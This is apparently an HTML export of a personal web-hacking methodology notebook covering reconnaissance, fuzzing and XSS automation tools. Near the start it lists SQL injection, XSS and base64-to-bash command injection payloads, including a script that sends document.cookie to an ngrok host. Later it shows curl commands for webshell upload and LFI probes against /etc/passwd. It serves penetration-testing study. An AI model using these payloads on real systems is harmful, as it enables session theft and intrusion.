encoded:</span></p><p></p><p>%27%3Bselect%20sl%E2%80%8B%E2%80%8Be​p(5)%2D%2D%20%2D%20%0D%0A%22%29%20or%20%221%22%3D%221%2D%2D%0D%0A%22%20or%20sl%E2%80%8B%E2%80%8Be​p(5)%3D1%2D%2D</p><p>%22%20or%20sl%E2%80%8B%E2%80%8Be​p(5)%3D1%2D%2D</p><p>%27%3Balert(%27xss%27)%3B%2F%2F%0D%0A%3Csvg%2Fonload%3D%22confirm(1)%22%3E%0D%0A%3Cscript%3Enew%20Image().src%20%3D%20%22http%3A%2F%2F5.tcp.eu.ngrok.io%3A15257%2Fcool.jpg%3Foutput%3D%22%20%2B%20document.cookie%3B%3C%2Fscript%3E</p><p>%7B%22target%22%3A%22%27%3Becho%20cGluZyAtYzIgMTAuMTMuNC4y%20%7C%20base64%20%2Dd%20%7C%20bash%3B%20%27%22%7D</p><p>%26%26%60sl%E2%80%8B%E2%80%8Be​p%2010%60%23%0D%0A%3Becho%20cGluZyAtYzIgMTAuMTMuNC4y%7Cbase64%20%2Dd%7Cbash%3B</p><p></p></div><div class='page'><a name="--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Technology_Discovery--WAF--WAF_Encoding_Techniques--url_encoded_717.html"></a><h1 class='title level-9'>url encoded</h1><br/><p><span style="color:#3f4043;">Normal:</span></p><p></p><p>&#39;;select sleep(5)-- -</p><p>&quot;) or &quot;1&quot;=&quot;1--</p><p>&quot; or sleep(5)=1--</p><p></p><p>&#39;;alert(&#39;xss&#39;);//</p><p>&lt;svg/onload=confirm(1)&gt;</p><p>&lt;script&gt;new Image().src = &quot;<a href="http://5.tcp.eu.ngrok.io:15257/cool.jpg?output=">http://5.tcp.eu.ngrok.io:15257/cool.jpg?output=</a>&quot; + document.cookie;&lt;/script&gt;</p><p></p><p>{</p><p>&quot;target&quot;:&quot;\&quot;;echo cGluZyAtYzIgMTAuMTMuNC4y | base64 -d | bash; \&quot;&quot;</p><p>}</p><p>&amp;&amp;`sleep 10`#</p><p>;echo cGluZyAtYzIgMTAuMTMuNC4y|base64 -d|bash;</p><p></p><p></p><p><span style="color:#3f4043;">html entities encoded:</span></p><p></p><p>%27%3Bselect%20sl%65ep(5)%2D%2D%20%2D%20%0D%0A%22%29%20or%20%221%22%3D%221%2D%2D%0D%0A%22%20or%20sl%65ep(5)%3D1%2</p><p></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Directory_Discovery_528.html"></a><h1 class='title level-6'>Directory Discovery</h1><br/><p><img src="images/528-1.png" alt="images/528-1.png" /></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Directory_Discovery--waymore_539.html"></a><h1 class='title level-7'>waymore</h1><br/><p>Can find allurls from a domain from archived endpoints, and can also find paramaters and links from the source code it downloads:</p><p><a href="https://github.com/xnl-h4ck3r/waymore">https://github.com/xnl-h4ck3r/waymore</a></p><p></p><p><span style="color:#3f4043;">Installation:</span></p><p>git clone <a href="https://github.com/xnl-h4ck3r/waymore.git">https://github.com/xnl-h4ck3r/waymore.git</a></p><p>cd waymore</p><p>sudo pip3 install -r requirements.txt</p><p>sudo ln -s /opt/waymore/waymore.py /usr/bin/waymore.py</p><p></p><p></p><p><span style="color:#3f4043;">Basic tool usage:</span></p><p>waymore.py -i tesla.com  -mode -B</p><p></p><p><span style="color:#3f4043;">Extract endpoints from output with xnLinkFinder:</span></p><p>xnLinkFinder.py -i ~/opt/waymore/results/tesla.com/ -sp <a href="http://tesla.com">http://tesla.com</a> -sf tesla.com -o tesla.txt</p><p></p><p><span style="color:#3f4043;">If you wanna look for other subdomains than tesla.com:</span></p><p>cat tesla.txt | grep -v tesla.com</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Directory_Discovery--feroxbuster_348.html"></a><h1 class='title level-7'>feroxbuster</h1><br/><p><span style="color:#3f4043;">Light:</span></p><p>feroxbuster -u <a href="http://testphp.vulnweb.com/">http://testphp.vulnweb.com/</a> -e -q -n --no-state -w /usr/share/seclists/Discovery/Web-Content/common.txt -o ferox_light.txt</p><p></p><p><span style="color:#3f4043;">Heavier:</span></p><p>feroxbuster -u <a href="http://testphp.vulnweb.com/">http://testphp.vulnweb.com/</a> -e -q -b -E --no-state -w gedit /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o ferox_medium.txt</p><p>feroxbuster -u <a href="http://testphp.vulnweb.com/">http://testphp.vulnweb.com/</a> -e -q -E -b --no-state -w gedit /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -o ferox_medium.txt</p><p></p><p><span style="color:#3f4043;">https scan:</span></p><p>feroxbuster -u <a href="https://set.windcorp.thm:443">https://set.windcorp.thm:443</a> -o dir.txt -e -q --no-state -t 80 -k</p><p></p><p></p><p>/use/share/wordlists/dirbuster/directory-list-2.3</p><p></p><p>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt</p><p></p><p>/usr/share/seclists/Discovery/Web-Content/big.txt</p><p></p><p>/usr/share/seclists/Discovery/Web-Content/CGIs.txt</p><p></p><p>/usr/share/seclists/Discovery/Web-Content/common.txt</p><p></p><p>/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt</p><p></p><p></p><p></p><p>jhaddix all.txt:</p><p><a href="https://gist.githubusercontent.com/jhaddix/86a06c5dc309d08580a018c66354a056/raw/96f4e51d96b2203f19f6381c8c545b278eaa0837/all.txt">https://gist.githubusercontent.com/jhaddix/86a06c5dc309d08580a018c66354a056/raw/96f4e51d96b2203f19f6381c8c545b278eaa0837/all.txt</a></p><p></p><p></p><p>feroxbuster -u <a href="http://testphp.vulnweb.com/">http://testphp.vulnweb.com/</a> -e -q --no-state -o ferox.txt -w /usr/share/seclists/Discovery/Web-Content/common.txt</p><p></p><p><span style="color:#3f4043;">Extract URLs only:</span></p><p>cat ferox.txt | grep -oE &#39;https?://[^[:space:]]+&#39;</p><p></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Directory_Discovery--gobuster_261.html"></a><h1 class='title level-7'>gobuster</h1><br/><p><span style="color:#3f4043;">General solid ones:</span></p><p>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u <a href="http://192.168.1.136/">http://192.168.1.136/</a></p><p>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u <a href="http://192.168.1.136/">http://192.168.1.136/</a> -x logs,bak,php,html,log,zip,gz,asp,aspx</p><p></p><p><span style="color:#3f4043;">gobuster over proxychains </span></p><p>gobuster dir -u &#39;<a href="http://10.3.3.47/action=/'">http://10.3.3.47/action=/&#39;</a> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --proxy socks5://127.0.0.1:1081</p><p></p><p>/use/share/wordlists/dirbuster/directory-list-2.3-medium.txt</p><p></p><p>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt</p><p></p><p>/usr/share/seclists/Discovery/Web-Content/big.txt</p><p></p><p>/usr/share/seclists/Discovery/Web-Content/CGIs.txt</p><p></p><p>/usr/share/seclists/Discovery/Web-Content/common.txt</p><p></p><p>/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Directory_Discovery--gau_518.html"></a><h1 class='title level-7'>gau</h1><br/><p><a href="https://github.com/lc/gau">https://github.com/lc/gau</a></p><p><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">getallurls (gau) fetches known URLs from AlienVault&#39;s Open Threat Exchange, the Wayback Machine, Common Crawl, and URLScan for any given domain. Inspired by Tomnomnom&#39;s waybackurls.</span></p><p></p><p></p><p></p><p></p><p>go install github.com/lc/gau/v2/cmd/gau@latest </p><p></p><p>gau --subs kronos-dev.tesla.com</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Directory_Discovery--apkleaks_581.html"></a><h1 class='title level-7'>apkleaks</h1><br/><p><a href="https://github.com/dwisiswant0/apkleaks">https://github.com/dwisiswant0/apkleaks</a></p><p></p><p>ApkLeaks – Scanning APK File For URIs, Endpoints And Secrets</p><p></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Directory_Discovery--Bypass_403_611.html"></a><h1 class='title level-7'>Bypass 403</h1><br/><p><a href="https://github.com/Dheerajmadhukar/4-ZERO-3">https://github.com/Dheerajmadhukar/4-ZERO-3</a></p><p></p><p>bash 403-bypass.sh -u https://target.com/secret --exploit</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--JS_Crawling_494.html"></a><h1 class='title level-6'>JS Crawling</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--JS_Crawling--JSScanner_586.html"></a><h1 class='title level-7'>JSScanner</h1><br/><p>cd /opt</p><p>git clone <a href="https://github.com/dark-warlord14/JSScanner.git">https://github.com/dark-warlord14/JSScanner.git</a></p><p></p><p>./install.sh</p><p>sudo ln -s /opt/JSScanner/script.sh /usr/bin/jsscanner</p><p></p><p>jsscanner alive.txt</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--JS_Crawling--katana_573.html"></a><h1 class='title level-7'>katana</h1><br/><p><a href="https://github.com/003random/getJS">https://github.com/003random/getJS</a></p><p><a href="https://github.com/projectdiscovery/katana">https://github.com/projectdiscovery/katana</a></p><p></p><p>katana -u <a href="http://127.0.0.1:80">http://127.0.0.1:80</a> -jc --depth 4 -silent</p><p></p><p></p><p>go through burp</p><p>katana -u <a href="http://testphp.vulnweb.com/">http://testphp.vulnweb.com/</a> -jc --depth 3 -silent -fx -s &#39;breadth-first&#39; --proxy <a href="http://127.0.0.1:8080">http://127.0.0.1:8080</a></p><p></p><p>ffuf -c -u &#39;http://testphp.vulnweb.com/FUZZ&#39; -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -r -x <a href="http://127.0.0.1:8080">http://127.0.0.1:8080</a></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--JS_Crawling--katana--grep_for_dangerous_functions_574.html"></a><h1 class='title level-8'>grep for dangerous functions</h1><br/><p>katana -u <a href="https://tesla.com">https://tesla.com</a> -d 4 -jc &gt; katana.tesla</p><p></p><p>cat katana.tesla | grep &#39;.js&#39; | grep -v &#39;?&#39; &gt; tesla.js</p><p></p><p>interlace -tL ./tesla.js -cL commands -threads 5 -v</p><p><img src="images/574-1.png" alt="images/574-1.png" /></p><p></p><p><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span></p><p>cat tesla_js_dump.txt | grep -v &quot;&#39;&quot; | grep -i &quot;eval&quot;</p><p>cat tesla_js_dump.txt | grep -v &quot;&#39;&quot; | grep -i &quot;InnerHTML ()&quot;</p><p>cat tesla_js_dump.txt | grep -v &quot;&#39;&quot; | grep -i &quot;Postmessage()&quot;</p><p>cat tesla_js_dump.txt | grep -v &quot;&#39;&quot; | grep -i &quot;String.prototype.search()&quot;</p><p>cat tesla_js_dump.txt | grep -v &quot;&#39;&quot; | grep -i &quot;access&quot;</p><p>cat tesla_js_dump.txt | grep -v &quot;&#39;&quot; | grep -i &quot;apikey&quot;</p><p>cat tesla_js_dump.txt | grep -v &quot;&#39;&quot; | grep -i &quot;token&quot;</p><p>cat tesla_js_dump.txt | grep -v &quot;&#39;&quot; | grep -i &quot;key&quot;</p><p>cat tesla_js_dump.txt | grep -v &quot;&#39;&quot; | grep -i &quot;password&quot;</p><p></p><p></p><p></p><p>keep an eye on:</p><p></p><p><a href="https://github.com/l4yton/RegHex/tree/master/.gf">https://github.com/l4yton/RegHex/tree/master/.gf</a></p><p><a href="https://medium.com/techiepedia/javascript-code-review-guide-for-bug-bounty-hunters-c95a8aa7037a">https://medium.com/techiepedia/javascript-code-review-guide-for-bug-bounty-hunters-c95a8aa7037a</a></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--JS_Crawling--xnLinkFinder_520.html"></a><h1 class='title level-7'>xnLinkFinder</h1><br/><p><a href="https://github.com/xnl-h4ck3r/xnLinkFinder">https://github.com/xnl-h4ck3r/xnLinkFinder</a></p><p></p><p><span style="color:#3f4043;">Parses javascript files and inline javascript to find new endpoints and potentially new paramaters</span></p><p></p><p>python3 /opt/xnLinkFinder/xnLinkFinder.py -i tesla_domainsites.txt -o crawl.txt </p><p> </p><p>python3 /opt/xnLinkFinder/xnLinkFinder.py -i tesla.com -v -d 2 -sp <a href="https://www.tesla.com">https://www.tesla.com</a></p><p> </p><p> </p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--JS_Crawling--hakcrawler_433.html"></a><h1 class='title level-7'>hakcrawler</h1><br/><p><span style="color:#3f4043;">finds new resources based on crawling javascript files</span></p><p></p><p><span style="color:#3f4043;">Usage:</span></p><p>echo http://vulnnet.thm | hakrawler</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--JS_Crawling--retire.js_535.html"></a><h1 class='title level-7'>retire.js</h1><br/><p>Tell you if a javascript library is outdated - Can contain exploits</p><p><a href="https://portswigger.net/bappstore/36238b534a78494db9bf2d03f112265c">https://portswigger.net/bappstore/36238b534a78494db9bf2d03f112265c</a></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Paramater_Discovery_529.html"></a><h1 class='title level-6'>Paramater Discovery</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Paramater_Discovery--Arjun_456.html"></a><h1 class='title level-7'>Arjun</h1><br/><p><a href="https://github.com/s0md3v/Arjun">https://github.com/s0md3v/Arjun</a></p><p></p><p><span style="color:#3f4043;">For finding paramaters. Amazing tool.</span></p><p></p><p>arjun -u <a href="https://api.example.com/endpoint">https://api.example.com/endpoint</a></p><p></p><p></p><p>arjun -u <a href="http://10.10.181.58:8765/home.php">http://10.10.181.58:8765/home.php</a> --headers &#39;Cookie: PHPSESSID=m3qp6eu5i87oht9g403ikiqi64&#39; -m POST</p><p></p><p></p><p><span style="color:#3f4043;">Working with several endpoints at once: </span></p><p>arjun -i endpoints</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Paramater_Discovery--paramspider_&_gf_444.html"></a><h1 class='title level-7'>paramspider & gf</h1><br/><p><a href="https://github.com/devanshbatham/ParamSpider">https://github.com/devanshbatham/ParamSpider</a></p><p></p><p><span style="color:#3f4043;">Spiders for paramaters mainly using waybackmachine and OSINT. Does not actively touch the target. Definitely use with bug bountys</span></p><p></p><p>python3 paramspider --domain tesla.com --exclude woff,png,svg,php,jpg --output /home/kali/bugbounty/tesla/tesla_params.txt</p><p></p><p><span style="color:#3f4043;">Use with gf: (A wrapper around grep with premade common regex. In this case, will be used to quickly parse data for juicy params.)</span></p><p><a href="https://github.com/tomnomnom/gf">https://github.com/tomnomnom/gf</a></p><p></p><p># Install gf</p><p>sudo go install github.com/tomnomnom/gf@latest</p><p>cd /opt/</p><p>sudo git clone <a href="https://github.com/tomnomnom/gf.git">https://github.com/tomnomnom/gf.git</a></p><p>echo &#39;export PATH=$PATH:/root/go/bin&#39; &gt;&gt; /root/.zshrc</p><p>echo &#39;export PATH=$PATH:/root/go/pkg/mod/github.com/tomnomnom/gf@v0.0.0-20200618134122-dcd4c361f9f5&#39; &gt;&gt; /root/.zshrc</p><p>source /root/.zshrc</p><p>cp -r /opt/gf/examples ~/.gf </p><p>sudo git clone <a href="https://github.com/1ndianl33t/Gf-Patterns">https://github.com/1ndianl33t/Gf-Patterns</a> /opt/Gf-Patterns</p><p>cp /opt/Gf-Patterns/*.json ~/.gf</p><p></p><p></p><p></p><p><a href="https://medium.com/@dhaliwalsargam/gf-tool-installation-8fcd285a4be2">https://medium.com/@dhaliwalsargam/gf-tool-installation-8fcd285a4be2</a></p><p><a href="https://youtu.be/m7JzOZKwbeE?t=323">https://youtu.be/m7JzOZKwbeE?t=323</a></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Paramater_Discovery--X8_606.html"></a><h1 class='title level-7'>X8</h1><br/><p><a href="https://github.com/Sh1Yo/x8#features">https://github.com/Sh1Yo/x8</a></p><p></p><p><a href="https://www.youtube.com/watch?v=vTd4d7XWo7I">https://www.youtube.com/watch?v=vTd4d7XWo7I</a></p><p></p><p>apt install cargo -y</p><p>apt install pkg-config</p><p>apt install libssl-dev</p><p>git clone <a href="https://github.com/Sh1Yo/x8">https://github.com/Sh1Yo/x8</a></p><p>cd x8</p><p>cargo build</p><p>cargo build --release</p><p>sudo ln /opt/x8/target/debug/x8 /usr/bin/x8</p><p></p><p><span style="color:#3f4043;">might be in /target/debug/x8 too </span></p><p></p><p></p><p>x8 -u <a href="https://testphp.vulnweb.com/listproducts.php">https://testphp.vulnweb.com/listproducts.php</a> -X GET POST -w /opt/tools/webapp/params.txt</p><p>x8 -u URLS.txt -X GET POST -w /opt/tools/webapp/params.txt -c 2</p><p></p><p>x8 -u urls.txt -X GET POST -w medium.txt -c 2 -o params_output.txt</p><p></p><p></p><p></p><p></p><p></p><p></p><p><span style="color:#3f4043;">Extract URLs only, then remove all useless file extensions if I want to fuzz for paramaters:</span></p><p>cat ferox.txt | grep -oE &#39;https?://[^[:space:]]+&#39; | grep -Ev &#39;\.(gif|png|jpg|js|css|txt)$&#39;&gt; URLS.txt</p><p></p><p><span style="color:#3f4043;">Extract only urls that has extensions at the end. (to avoid directories for param fuzzing):</span></p><p>grep -E &#39;\.[a-zA-Z]{2,4}$&#39; urls.txt &gt; URL_files.txt</p><p></p><p></p><p><span style="color:#3f4043;">Finding endpoints:</span></p><p>feroxbuster -u <a href="http://testphp.vulnweb.com/">http://testphp.vulnweb.com/</a> -e -q --no-state -o ferox.txt -w /usr/share/seclists/Discovery/Web-Content/common.txt</p><p></p><p><span style="color:#3f4043;">Extract URLs only:</span></p><p>cat ferox.txt | grep -v 404 | grep -v &#39;MSG&#39; | grep -v 403 | grep -v 500 | grep -oE &#39;https?://[^[:space:]]+&#39; | tee URLS.txt</p><p></p><p></p><p>cat katana.txt | grep &quot;=&quot;</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Paramater_Discovery--X8--Paramater_Wordlists_607.html"></a><h1 class='title level-8'>Paramater Wordlists</h1><br/><p><span style="color:#3f4043;">Samlists paramaters:</span></p><p><a href="https://github.com/the-xentropy/samlists/blob/main/sam-cc-parameters-mixedcase-all.txt">https://github.com/the-xentropy/samlists/blob/main/sam-cc-parameters-mixedcase-all.txt</a></p><p>wget <a href="https://raw.githubusercontent.com/the-xentropy/samlists/main/sam-cc-parameters-mixedcase-all.txt">https://raw.githubusercontent.com/the-xentropy/samlists/main/sam-cc-parameters-mixedcase-all.txt</a></p><p></p><p><span style="color:#3f4043;">Arjun paramaters:</span></p><p><a href="https://github.com/s0md3v/Arjun/blob/master/arjun/db/medium.txt">https://github.com/s0md3v/Arjun/blob/master/arjun/db/medium.txt</a></p><p>wget <a href="https://raw.githubusercontent.com/s0md3v/Arjun/master/arjun/db/medium.txt">https://raw.githubusercontent.com/s0md3v/Arjun/master/arjun/db/medium.txt</a></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Fuzzing_5.html"></a><h1 class='title level-6'>Fuzzing</h1><br/><p>ffuf usage</p><p><a href="https://www.youtube.com/watch?v=UQZ7kATjAJk">https://www.youtube.com/watch?v=UQZ7kATjAJk</a></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Fuzzing--Fuzzing_Directories-Files_624.html"></a><h1 class='title level-7'>Fuzzing Directories/Files</h1><br/><p>Dirs:</p><p>ffuf -c -u &#39;http://$t/FUZZ&#39; -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -r</p><p></p><p>Files:</p><p>ffuf -c -u &#39;http://$t/FUZZ&#39; -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -r</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Fuzzing--Fuzzing_Subdomains_15.html"></a><h1 class='title level-7'>Fuzzing Subdomains</h1><br/><p><span style="color:#234141;">Subdomain enumeration with size filter to get back unique responses:</span></p><p>ffuf -u &#39;<a href="http://harder.local/'">http://harder.local/&#39;</a> -c -w /usr/share/secLists/Discovery/DNS/subdomains-top1million-20000.txt -H &#39;Host: FUZZ.harder.local&#39; -t 100 -fs 1985</p><p></p><p>ffuf -c -u &#39;<a href="http://10.11.1.8'">http://10.11.1.8&#39;</a> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H &#39;Host: FUZZ.WORKGROUP&#39; -fs 218 | tee ./subdomain_discovery</p><p></p><p></p><p>ffuf -c -u &#39;<a href="https://xor.com'">https://xor.com&#39;</a> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H &#39;Host: FUZZ.xor.com&#39; -fs 0 | tee ./subdomain_discovery</p><p></p><p>ffuf -u &#39;<a href="http://vulnnet.thm/'">http://vulnnet.thm/&#39;</a> -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 100 -H &quot;Host: FUZZ.vulnnet.thm&quot;</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Fuzzing--Fuzzing_LFI_paramaters_170.html"></a><h1 class='title level-7'>Fuzzing LFI paramaters</h1><br/><p><span style="color:#3f4043;">LFI fuzzing:</span></p><p>ffuf -u &#39;<a href="https://172.31.3.1/forum.chatlogs/chatlogs.php?file=FUZZ'">https://172.31.3.1/forum.chatlogs/chatlogs.php?file=FUZZ&#39;</a> -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt</p><p></p><p><span style="color:#3f4043;">Fuzzing paramaters:</span></p><p>ffuf -u &#39;<a href="http://10.11.1.123/books/LIB/model/db.php?FUZZ=../../../../../../../../etc/passwd'">http://10.11.1.123/books/LIB/model/db.php?FUZZ=../../../../../../../../etc/passwd&#39;</a> -w ./LFI-params.txt -fs 0</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Fuzzing--Fuzzing_for_http_methods_402.html"></a><h1 class='title level-7'>Fuzzing for http methods</h1><br/><p><span style="color:#3f4043;">Fuzzing for PUT method:</span></p><p>wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -X PUT -u <a href="http://192.168.1.47/FUZZ">http://192.168.1.47/FUZZ</a> --sc 201 -L</p><p>wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -X PUT -u <a href="http://192.168.1.50/FUZZ">http://192.168.1.50/FUZZ</a> --hc 404,501 -L</p><p></p><p><span style="color:#3f4043;">Fuzzing http methods:</span></p><p>wfuzz -z file,methods.txt -z file,dirs.txt -X FUZZ -u <a href="http://192.168.1.47/FUZ2Z">http://192.168.1.47/FUZ2Z</a> -L</p><p></p><p><span style="color:#3f4043;">Fuzzing for PUT method: (ffuf is a lot faster as it&#39;s written in go. In contrast to wfuzz which is written in python)   (ffuf by default doesn&#39;t show 201 responses, but we definitely wanna see that if we&#39;re fuzzing for PUT methods)</span></p><p>ffuf -u <a href="http://192.168.1.50/FUZZ">http://192.168.1.50/FUZZ</a> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -X PUT -mc 200,201,204,301,302,307,401,403,405,500 -r</p><p>ffuf -u <a href="http://192.168.1.50/FUZZ">http://192.168.1.50/FUZZ</a> -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -X PUT -mc 200,201,204,301,302,307,401,403,405,500 -r </p><p></p><p></p><p></p><p></p><p><span style="color:#3f4043;">PUT files:</span></p><p>curl -X DELETE -T webshell.php <a href="http://192.168.1.50/test/">http://192.168.1.50/test/</a> -v --http1.0</p><p>curl -X DELETE -T webshell.php <a href="http://192.168.1.50/test/">http://192.168.1.50/test/</a> -v</p><p></p><p><span style="color:#3f4043;">DELETE files:</span></p><p>curl -X DELETE <a href="http://192.168.1.50/test/webshell.php">http://192.168.1.50/test/webshell.php</a> -v --http1.0</p><p>curl -X DELETE <a href="http://192.168.1.50/test/webshell.php">http://192.168.1.50/test/webshell.php</a> -v</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Fuzzing--fuzzing_paramaters_447.html"></a><h1 class='title level-7'>fuzzing paramaters</h1><br/><p><span style="color:#3f4043;">Fuzzing paramaters:</span></p><p></p><p>wget <a href="https://raw.githubusercontent.com/whiteknight7/wordlist/main/fuzz-lfi-params-list.txt">https://raw.githubusercontent.com/whiteknight7/wordlist/main/fuzz-lfi-params-list.txt</a></p><p></p><p></p><p>ffuf -c -u &#39;<a href="https://172.31.3.1/forum.chatlogs/chatlogs.php?FUZZ=id">https://172.31.3.1/forum.chatlogs/chatlogs.php?FUZZ=id</a>&#39; -w <span style="color:#000000;">/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt</span> -ignore-body</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Automation_workflow_517.html"></a><h1 class='title level-6'>Automation workflow</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Automation_workflow--Automation_Scripts_and_Oneliners_722.html"></a><h1 class='title level-7'>Automation Scripts and Oneliners</h1><br/></div><div class='page'><a name="eration--Initial_Recon--General_methodology--Content_Discovery--Automation_workflow--Automation_Scripts_and_Oneliners--XSS_automation_723.html"></a><h1 class='title level-8'>XSS automation</h1><br/><p>Find URLs and parameters</p><p>paramspider -d example.com -o output.txt &amp;&amp; cat output/output.txt | gau | sort -u &gt; urls.txt</p><p></p><p>Scan for XSS vulnerabilities</p><p>cat urls.txt | Gxss -c 100 -p &#39;test&#39; | dalfox pipe -o xss.txt</p><p></p><p>Fast crawling and fuzzing for hidden endpoints</p><p>gospider -s <a href="https://example.com">https://example.com</a> -c 10 -d 2 --blacklist &quot;\.(jpg|jpeg|gif|css|png|ttf|woff|pdf|svg|txt)&quot; | tee crawl.txt</p><p></p></div><div class='page'><a name="econ--General_methodology--Content_Discovery--Automation_workflow--Automation_Scripts_and_Oneliners--XSS_automation--automation_works_734.html"></a><h1 class='title level-9'>automation works</h1><br/><p><span style="color:#3f4043;">Paramspider &gt; gxss &gt; ?xspear:</span></p><p>cat URL.txt| xargs -I {} paramspider -d {} | grep -oE &#39;https?://[^[:space:]]+&#39; | grep &quot;=&quot; | tee -a params.tmp | qsreplace -a | xargs -I {} XSpear -u {} -a -t 50 | tee spider_xspear.txt</p><p></p><p><span style="color:#3f4043;">Paramspider &gt; gxss &gt; xspear (without annoying js or css params):</span></p><p>cat URL.txt | xargs -I {} paramspider -d {} | grep -oE &#39;https?://[^[:space:]]+&#39; | grep -v &#39;.js&#39; | grep -v &#39;.css&#39; | Gxss -c 100 -p &#39;&lt;&#39; | qsreplace -a | xargs -I {} XSpear -u {} -a -t 50 | tee spider_xspear.txt</p><p></p><p><span style="color:#3f4043;">Gospider &gt; gxss:</span></p><p>gospider -S URL.txt -t 3 -c 20 -d 2 --blacklist &quot;.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)&quot; | tr &#39; &#39; &#39;\n&#39; | grep -Ev &#39;\.(js|css|png|jpg|woff|woff2)$&#39; | Gxss -c 100 -p &#39;&lt;&#39; | qsreplace -a | tee xss.txt</p><p></p><p><span style="color:#3f4043;">Gospider &gt; gxss &gt; xspear &lt;3</span></p><p>gospider -S URL.txt -t 3 -c 20 -d 5 --blacklist &quot;.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js|css)&quot; | tr &#39; &#39; &#39;\n&#39; </p><p></p><p><span style="color:#3f4043;">gau|hakrawler kxss &lt;3</span> </p><p>echo &#39;<a href="https://cyeb.hu'">https://cyeb.hu&#39;</a> | gau | grep &#39;=&#39; | grep -Ev &#39;\.(js|css|png|jpg)$&#39; | qsreplace -a | tee params.txt | kxss | tee xss1.txt &amp;&amp; cat params.txt | qsreplace &#39;FUZZ&#39; &gt; params.tmp</p><p></p><p>echo &#39;<a href="http://testphp.vulnweb.com/'">http://testphp.vulnweb.com/&#39;</a> | hakrawler -d 4 | grep &#39;=&#39; | grep -Ev &#39;\.(js|css|png|jpg)$&#39; | qsreplace -a | tee params.txt | kxss | tee xss1.txt &amp;&amp; cat params.txt | qsreplace &#39;FUZZ&#39; &gt; params.tmp</p><p></p><p><span style="color:#3f4043;">TEST: Scan for vulnerable parameters with Gau and Gf:</span></p><p>gau example.com | gf xss | dalfox pipe --silence --skip-bav -o output.txt</p><p></p><p>katana -u <a href="http://testphp.vulnweb.com">http://testphp.vulnweb.com</a> -d 6 -jc | grep &#39;=&#39;| grep -Ev &#39;\.(js|css|png|jpg|woff|woff2)$&#39; | qsreplace -a -ignore-path | tee params.txt | qsreplace &#39;FUZZ&#39; &gt; params.tmp</p><p></p></div><div class='page'><a name="ral_methodology--Content_Discovery--Automation_workflow--Automation_Scripts_and_Oneliners--XSS_automation--automation_works--setup.sh_853.html"></a><h1 class='title level-10'>setup.sh</h1><br/><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#!/bin/bash</span><br /><br /><span 